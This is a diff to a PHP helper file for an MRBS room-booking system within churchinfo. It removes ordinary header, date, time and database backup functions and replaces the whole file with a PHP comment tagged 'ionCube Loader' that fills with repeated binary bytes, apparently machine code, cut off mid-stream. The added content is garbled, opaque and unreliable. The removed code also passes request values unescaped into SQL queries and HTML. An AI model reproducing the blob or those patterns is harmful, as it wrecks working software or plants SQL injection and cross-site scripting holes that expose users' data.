-    </SCRIPT>
-
-  </HEAD>
-
-  <body onload="javascript:scrollToCoordinates()">
-
-<?php
-
-// churchinfo MRBS integration begins
-
-	Header_Body_scripts();
-
-
-
-	if ($iNavMethod != 2)	{
-
-		Header_body_menu();
-
-	}
-
-	else {
-
-		Header_body_nomenu();
-
-	}
-
-// churchinfo MRBS integration ends
-
-	 if ( $GLOBALS["pview"] != 1 ) { ?>
-
-
-
-   <?php # show a warning if this is using a low version of php
-
-       if (substr(phpversion(), 0, 1) <= 3)
-
-	       echo get_vocab("not_php3");
-
-//       if (!empty($locale_warning))
-
-//               echo "[Warning: ".$locale_warning."]";
-
-   ?>
-
-
-
-    <TABLE WIDTH="100%">
-
-      <TR>
-
-        <TD BGCOLOR="#5B69A6">
-
-          <TABLE WIDTH="100%" BORDER=0>
-
-            <TR>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF">
-
-                <FONT SIZE=4>
-
-                  <B><?php echo $mrbs_company ?></B><BR>
-
-                  <A HREF="index.php"><?php echo get_vocab("mrbs") ?></A>
-
-                </FONT>
-
-              </TD>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF">
-
-                <FORM ACTION="day.php" METHOD=GET name="Form1">
-
-                  <FONT SIZE=2>
-
-<?php
-
-   genDateSelector("", $day, $month, $year); // Note: The 1st arg must match the last arg in the call to ChangeOptionDays below.
-
-   if (!empty($area))
-
-        echo "
-
-                    <INPUT TYPE=HIDDEN NAME=area VALUE=$area>\n"
-
- 
-
-?>
-
-	            <SCRIPT LANGUAGE="JavaScript">
-
-                    <!--
-
-                    // fix number of days for the $month/$year that you start with
-
-                    ChangeOptionDays(document.Form1, ''); // Note: The 2nd arg must match the first in the call to genDateSelector above.
-
-                    // -->
-
-                    </SCRIPT>
-
-                    <INPUT TYPE=SUBMIT VALUE="<?php echo get_vocab("goto") ?>">
-
-                  </FONT>
-
-                </FORM>
-
-              </TD>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF" ALIGN=CENTER>
-
-                <A HREF="help.php?day=<?php echo $day ?>&month=<?php echo $month ?>&year=<?php echo $year ?>"><?php echo get_vocab("help") ?></A>
-
-              </TD>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF" ALIGN=CENTER>
-
-                <A HREF="admin.php?day=<?php echo $day ?>&month=<?php echo $month ?>&year=<?php echo $year ?>"><?php echo get_vocab("admin") ?></A>
-
-              </TD>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF" ALIGN=CENTER>
-
-                <A HREF="report.php"><?php echo get_vocab("report") ?></A>
-
-              </TD>
-
-              <TD CLASS="banner" BGCOLOR="#C0E0FF" ALIGN=CENTER>
-
-                <FORM METHOD=GET ACTION="search.php">
-
-                  <FONT SIZE=2>
-
-                    <A HREF="search.php?advanced=1"><?php echo get_vocab("search") ?></A>
-
-                  </FONT>
-
-                  <INPUT TYPE=TEXT   NAME="search_str" VALUE="<?php echo $search_str ?>" SIZE=10>
-
-                  <INPUT TYPE=HIDDEN NAME=day        VALUE="<?php echo $day        ?>"        >
-
-                  <INPUT TYPE=HIDDEN NAME=month      VALUE="<?php echo $month      ?>"        >
-
-                  <INPUT TYPE=HIDDEN NAME=year       VALUE="<?php echo $year       ?>"        >
-
-<?php
-
-   if (!empty($area))
-
-        echo "
-
-                  <INPUT TYPE=HIDDEN NAME=area VALUE=$area>\n"
-
-?>
-
-                </FORM>
-
-              </TD>
-
-<?php
-
-    # For session protocols that define their own logon box...
-
-    if (function_exists('PrintLogonBox'))
-
-   	{
-
-   	PrintLogonBox();
-
-   	}
-
-?>
-
-            </TR>
-
-          </TABLE>
-
-        </TD>
-
-      </TR>
-
-    </TABLE>
-
-<?php } ?>
-
-<?php
-
-}
-
-
-
-function toTimeString(&$dur, &$units)
-
-{
-
-	if($dur >= 60)
-
-	{
-
-		$dur /= 60;
-
-
-
-		if($dur >= 60)
-
-		{
-
-
-			$dur /= 60;
-
-
-
-			if(($dur >= 24) && ($dur % 24 == 0))
-
-			{
-
-				$dur /= 24;
-
-
-
-				if(($dur >= 7) && ($dur % 7 == 0))
-
-				{
-
-					$dur /= 7;
-
-
-
-					if(($dur >= 52) && ($dur % 52 == 0))
-
-					{
-
-						$dur  /= 52;
-
-						$units = get_vocab("years");
-
-					}
-
-					else
-
-
-
-						$units = get_vocab("weeks");
-
-				}
-
-				else
-
-					$units = get_vocab("days");
-
-			}
-
-			else
-
-				$units = get_vocab("hours");
-
-		}
-
-		else
-
-			$units = get_vocab("minutes");
-
-	}
-
-	else
-
-		$units = get_vocab("seconds");
-
-}
-
-
-
-
-
-function toPeriodString($start_period, &$dur, &$units)
-
-{
-
-	global $enable_periods;
-
-        global $periods;
-
-
-
-        $max_periods = count($periods);
-
-
-
-	$dur /= 60;
-
-
-
-        if( $dur >= $max_periods || $start_period == 0 )
-
-        {
-
-                if( $start_period == 0 && $dur == $max_periods )
-
-                {
-
-                        $units = get_vocab("days");
-
-                        $dur = 1;
-
-                        return;
-
-                }
-
-
-
-                $dur /= 60;
-
-                if(($dur >= 24) && is_int($dur))
-
-                {
-
-                	$dur /= 24;
-
-			$units = get_vocab("days");
-
-                        return;
-
-                }
-
-                else
-
-                {
-
-			$dur *= 60;
-
-                        $dur = ($dur % $max_periods) + floor( $dur/(24*60) ) * $max_periods;
-
-                        $units = get_vocab("periods");
-
-                        return;
-
-		}
-
-        }
-
-        else
-
-		$units = get_vocab("periods");
-
-}
-
-
-
-
-
-
-
-function genDateSelector($prefix, $day, $month, $year)
-
-{
-
-	if($day   == 0) $day = date("d");
-
-	if($month == 0) $month = date("m");
-
-	if($year  == 0) $year = date("Y");
-
-	
-
-	echo "
-
-                  <SELECT NAME=\"${prefix}day\">";
-
-	
-
-	for($i = 1; $i <= 31; $i++)
-
-		echo "
-
-                    <OPTION" . ($i == $day ? " SELECTED" : "") . ">$i";
-
-
-
-	echo "
-
-                  </SELECT>
-
-
-
-                  <SELECT NAME=\"${prefix}month\" onchange=\"ChangeOptionDays(this.form,'$prefix')\">";
-
-
-
-	for($i = 1; $i <= 12; $i++)
-
-	{
-
-		$m = utf8_strftime("%b", mktime(0, 0, 0, $i, 1, $year));
-
-		
-
-		print "
-
-                    <OPTION VALUE=\"$i\"" . ($i == $month ? " SELECTED" : "") . ">$m";
-
-	}
-
-
-
-	echo "
-
-                  </SELECT>
-
-	          <SELECT NAME=\"${prefix}year\" onchange=\"ChangeOptionDays(this.form,'$prefix')\">";
-
-
-
-	$min = min($year, date("Y")) - 5;
-
-	$max = max($year, date("Y")) + 5;
-
-
-
-	for($i = $min; $i <= $max; $i++)
-
-		print "
-
-                    <OPTION VALUE=\"$i\"" . ($i == $year ? " SELECTED" : "") . ">$i";
-
-
-
-	echo "
-
-                  </SELECT>";
-
-}
-
-
-
-# Error handler - this is used to display serious errors such as database
-
-# errors without sending incomplete HTML pages. This is only used for
-
-# errors which "should never happen", not those caused by bad inputs.
-
-# If $need_header!=0 output the top of the page too, else assume the
-
-# caller did that. Alway outputs the bottom of the page and exits.
-
-function fatal_error($need_header, $message)
-
-{
-
-	if ($need_header) print_header(0, 0, 0, 0);
-
-	echo $message;
-
-	include "trailer.inc";
-
-	exit;
-
-}
-
-
-
-# Apply backslash-escape quoting unless PHP is configured to do it
-
-# automatically. Use this for GET/POST form parameters, since we
-
-# cannot predict if the PHP configuration file has magic_quotes_gpc on.
-
-function slashes($s)
-
-{
-
-	if (get_magic_quotes_gpc()) return $s;
-
-	else return addslashes($s);
-
-}
-
-
-
-# Remove backslash-escape quoting if PHP is configured to do it with
-
-# magic_quotes_gpc. Use this whenever you need the actual value of a GET/POST
-
-# form parameter (which might have special characters) regardless of PHP's
-
-# magic_quotes_gpc setting.
-
-function unslashes($s)
-
-{
-
-	if (get_magic_quotes_gpc()) return stripslashes($s);
-
-	else return $s;
-
-}
-
-
-
-# Return a default area; used if no area is already known. This returns the
-
-# lowest area ID in the database (no guaranty there is an area 1).
-
-# This could be changed to implement something like per-user defaults.
-
-function get_default_area()
-
-{
-
-	global $tbl_area;
-
-	$area = sql_query1("SELECT id FROM $tbl_area ORDER BY area_name LIMIT 1");
-
-	return ($area < 0 ? 0 : $area);
-
-}
-
-
-
-# Return a default room given a valid area; used if no room is already known.
-
-# This returns the first room in alphbetic order in the database.
-
-# This could be changed to implement something like per-user defaults.
-
-function get_default_room($area)
-
-{
-
-	global $tbl_room;
-
-	$room = sql_query1("SELECT id FROM $tbl_room WHERE area_id=$area ORDER BY room_name LIMIT 1");
-
-	return ($room < 0 ? 0 : $room);
-
-}
-
-
-
-# Get the local day name based on language. Note 2000-01-02 is a Sunday.
-
-function day_name($daynumber)
-
-{
-
-	return utf8_strftime("%A", mktime(0,0,0,1,2+$daynumber,2000));
-
-}
-
-
-
-function hour_min_format()
-
-{
-
-        global $twentyfourhour_format;
-
-        if ($twentyfourhour_format)
-
-	{
-
-  	        return "%H:%M";
-
-	}
-
-	else
-
-	{
-
-		return "%I:%M%p";
-
-	}
-
-}
-
-
-
-function period_date_string($t, $mod_time=0)
-
-{
-
-        global $periods;
-
-
-
-	$time = getdate($t);
-
-        $p_num = $time["minutes"] + $mod_time;
-
-        if( $p_num < 0 ) $p_num = 0;
-
-        if( $p_num >= count($periods) - 1 ) $p_num = count($periods ) - 1;
-
-	# I have made the separater a ',' as a '-' leads to an ambiguious
-
-	# display in report.php when showing end times.
-
-        return array($p_num, $periods[$p_num] . utf8_strftime(", %A %d %B %Y",$t));
-
-}
-
-
-
-function period_time_string($t, $mod_time=0)
-
-{
-
-        global $periods;
-
-
-
-	$time = getdate($t);
-
-        $p_num = $time["minutes"] + $mod_time;
-
-        if( $p_num < 0 ) $p_num = 0;
-
-        if( $p_num >= count($periods) - 1 ) $p_num = count($periods ) - 1;
-
-        return $periods[$p_num];
-
-}
-
-
-
-function time_date_string($t)
-
-{
-
-        global $twentyfourhour_format;
-
-
-
-        if ($twentyfourhour_format)
-
-	{
-
-  	        return utf8_strftime("%H:%M:%S - %A %d %B %Y",$t);
-
-	}
-
-	else
-
-	{
-
-	        return utf8_strftime("%I:%M:%S%p - %A %d %B %Y",$t);
-
-	}
-
-}
-
-
-
-# Output a start table cell tag <td> with color class and fallback color.
-
-# $colclass is an entry type (A-J), "white" for empty, or "red" for highlighted.
-
-# The colors for CSS browsers can be found in the style sheet. The colors
-
-# in the array below are fallback for non-CSS browsers only.
-
-function tdcell($colclass)
-
-{
-
-	# This should be 'static $ecolors = array(...)' but that crashes PHP3.0.12!
-
-	static $ecolors;
-
-	if (!isset($ecolors)) $ecolors = array("A"=>"#FFCCFF", "B"=>"#99CCCC",
-
-		"C"=>"#FF9999", "D"=>"#FFFF99", "E"=>"#C0E0FF", "F"=>"#FFCC99",
-
-		"G"=>"#FF6666", "H"=>"#66FFFF", "I"=>"#DDFFDD", "J"=>"#CCCCCC",
-
-		"red"=>"#FFF0F0", "white"=>"#FFFFFF");
-
-	if (isset($ecolors[$colclass]))
-
-		echo "<td class=\"$colclass\" bgcolor=\"$ecolors[$colclass]\">";
-
-	else
-
-		echo "<td class=\"$colclass\">";
-
-}
-
-
-
-# Display the entry-type color key. This has up to 2 rows, up to 5 columns.
-
-function show_colour_key()
-
-{
-
-	global $typel;
-
-	echo "<table border=0><tr>\n";
-
-	$nct = 0;
-
-	for ($ct = "A"; $ct <= "Z"; $ct++)
-
-	{
-
-		if (!empty($typel[$ct]))
-
-		{
-
-			if (++$nct > 5)
-
-			{
-
-				$nct = 0;
-
-				echo "</tr><tr>";
-
-			}
-
-			tdcell($ct);
-
-			echo "$typel[$ct]</td>\n";
-
-		}
-
-	}
-
-	echo "</tr></table>\n";
-
-}
-
-
-
-# Round time down to the nearest resolution
-
-function round_t_down($t, $resolution, $am7)
-
-{
-
-        return (int)$t - (int)abs(((int)$t-(int)$am7)
-
-				  % $resolution);
-
-}
-
-
-
-# Round time up to the nearest resolution
-
-function round_t_up($t, $resolution, $am7)
-
-{
-
-	if (($t-$am7) % $resolution != 0)
-
-	{
-
-		return $t + $resolution - abs(((int)$t-(int)
-
-					       $am7) % $resolution);
-
-	}
-
-	else
-
-	{
-
-		return $t;
-
-	}
-
-}
-
-
-
-# generates some html that can be used to select which area should be
-
-# displayed.
-
-function make_area_select_html( $link, $current, $year, $month, $day )
-
-{
-
-	global $tbl_area;
-
-	$out_html = "
-
-<form name=\"areaChangeForm\" method=get action=\"$link\">
-
-  <select name=\"area\" onChange=\"document.areaChangeForm.submit()\">";
-
-
-
-	$sql = "select id, area_name from $tbl_area order by area_name";
-
-   	$res = sql_query($sql);
-
-   	if ($res) for ($i = 0; ($row = sql_row($res, $i)); $i++)
-
-   	{
-
-		$selected = ($row[0] == $current) ? "selected" : "";
-
-		$out_html .= "
-
-    <option $selected value=\"".$row[0]."\">" . htmlspecialchars($row[1]);
-
-   	}
-
-	$out_html .= "
-
-  </select>
-
-
-
-  <INPUT TYPE=HIDDEN NAME=day        VALUE=\"$day\">
-
-  <INPUT TYPE=HIDDEN NAME=month      VALUE=\"$month\">
-
-  <INPUT TYPE=HIDDEN NAME=year       VALUE=\"$year\">
-
-  <input type=submit value=\"".get_vocab("change")."\">
-
-</form>\n";
-
-
-
-	return $out_html;
-
-} # end make_area_select_html
-
-
-
-function make_room_select_html( $link, $area, $current, $year, $month, $day )
-
-{
-
-	global $tbl_room;
-
-	$out_html = "
-
-<form name=\"roomChangeForm\" method=get action=\"$link\">
-
-  <select name=\"room\" onChange=\"document.roomChangeForm.submit()\">";
-
-
-
-	$sql = "select id, room_name from $tbl_room where area_id=$area order by room_name";
-
-   	$res = sql_query($sql);
-
-   	if ($res) for ($i = 0; ($row = sql_row($res, $i)); $i++)
-
-   	{
-
-		$selected = ($row[0] == $current) ? "selected" : "";
-
-		$out_html .= "
-
-    <option $selected value=\"".$row[0]."\">" . htmlspecialchars($row[1]);
-
-   	}
-
-	$out_html .= "
-
-  </select>
-
-  <INPUT TYPE=HIDDEN NAME=day        VALUE=\"$day\"        >
-
-  <INPUT TYPE=HIDDEN NAME=month      VALUE=\"$month\"        >
-
-  <INPUT TYPE=HIDDEN NAME=year       VALUE=\"$year\"      >
-
-  <INPUT TYPE=HIDDEN NAME=area       VALUE=\"$area\"         >
-
-  <input type=submit value=\"".get_vocab("change")."\">
-
-</form>\n";
-
-
-
-	return $out_html;
-
-} # end make_area_select_html
-
-
-
-
-
-# This will return the appropriate value for isdst for mktime().
-
-# The order of the arguments was chosen to match those of mktime.
-
-# hour is added so that this function can when necessary only be
-
-# run if the time is between midnight and 3am (all DST changes
-
-# occur in this period.
-
-function is_dst ( $month, $day, $year, $hour="-1" )
-
-{
-
-
-
-	if( $hour != -1  && $hour > 3)
-
-		return( -1 );
-
-	
-
-	# entering DST
-
-	if( !date( "I", mktime(12, 0, 0, $month, $day-1, $year)) && 
-
-	    date( "I", mktime(12, 0, 0, $month, $day, $year)))
-
-		return( 0 ); 
-
-
-
-	# leaving DST
-
-	elseif( date( "I", mktime(12, 0, 0, $month, $day-1, $year)) && 
-
-	    !date( "I", mktime(12, 0, 0, $month, $day, $year)))
-
-		return( 1 );
-
-	else
-
-		return( -1 );
-
-}
-
-
-
-# if crossing dst determine if you need to make a modification
-
-# of 3600 seconds (1 hour) in either direction
-
-function cross_dst ( $start, $end )
-
-{
-
-	
-
-	# entering DST
-
-	if( !date( "I", $start) &&  date( "I", $end))
-
-		$modification = -3600;
-
-
-
-	# leaving DST
-
-	elseif(  date( "I", $start) && !date( "I", $end))
-
-		$modification = 3600;
-
-	else
-
-		$modification = 0;
-
-
-
-	return $modification;
-
-}
-
-
-
-function backup_tables($host,$user,$pass,$name,$type,$tables = '*')
-
-{
-
-	$return = '';
-
-	$link = mysql_connect($host,$user,$pass);
-
-	mysql_select_db($name,$link);
-
-	
-
-	//get all of the tables
-
-	if($tables == '*')
-
-	{
-
-		$tables = array();
-
-		$result = mysql_query('SHOW TABLES');
-
-		while($row = mysql_fetch_row($result))
-
-		{
-
-			$tables[] = $row[0];
-
-		}
-
-	}
-
-	else
-
-	{
-
-		$tables = is_array($tables) ? $tables : explode(',',$tables);
-
-	}
-
-	
-
-	//cycle through
-
-	foreach($tables as $table)
-
-	{
-
-		$result = mysql_query('SELECT * FROM '.$table);
-
-		$num_fields = mysql_num_fields($result);
-
-		
-
-		$return.= 'DROP TABLE '.$table.';';
-
-		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
-
-		$return.= "\n\n".$row2[1].";\n\n";
-
-		
-
-		for ($i = 0; $i < $num_fields; $i++) 
-
-		{
-
-			while($row = mysql_fetch_row($result))
-
-			{
-
-				$return.= 'INSERT INTO '.$table.' VALUES(';
-
-				for($j=0; $j<$num_fields; $j++) 
-
-				{
-
-					$row[$j] = addslashes($row[$j]);
-
-					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
-
-					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
-
-					if ($j<($num_fields-1)) { $return.= ','; }
-
-				}
-
-				$return.= ");\n";
-
-			}
-
-		}
-
-		$return.="\n\n\n";
-
-	}
-
-	
-
-	//save file
-
-	$database_backup = '../backups/soa_db_backup'.time().'.sql';
-
-	$handle = fopen($database_backup,'w+');
-
-	fwrite($handle,$return);
-
-	fclose($handle);
-
-	
-
-	//insert to record
-
-	$filename = 'fome_db_backup'.time().'.sql';
-
-	$date = date('Y-m-d H:i:s');
-
-
-
-	$add = mysql_query("INSERT INTO backups (`id`, `date`, `type`, `file`) 
-
-			VALUES (NULL, '$date', '$type', '$filename');") or die(mysql_error());
-
-	return $filename;
-
-}
-
-
-
-function restore_tables($filename,$host,$username,$password,$database){
-
-	mysql_connect($host, $username, $password) or die('Error connecting to MySQL server: ' . mysql_error());
-
-	mysql_select_db($database) or die('Error selecting MySQL database: ' . mysql_error());
-
-
-
-	$templine = '';
-
-	// Read in entire file
-
-	$lines = file($filename);
-
-	// Loop through each line
-
-	foreach ($lines as $line){
-
-		if (substr($line, 0, 2) == '--' || $line == '')
-
-			continue;
-
-	
-
-	$templine .= $line;
-
-		if (substr(trim($line), -1, 1) == ';')	{
-
-			mysql_query($templine) or print('Error performing query \'<strong>' . $templine . '\': ' . mysql_error() . '<br /><br />');
-
-			$templine = '';
-
-		}
-
-	}
-
-}
-
-
-
-?>
+<?php /* AndroidServer-Lifehost.info-Service-C#-Java-ionCube Loader-ZendË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
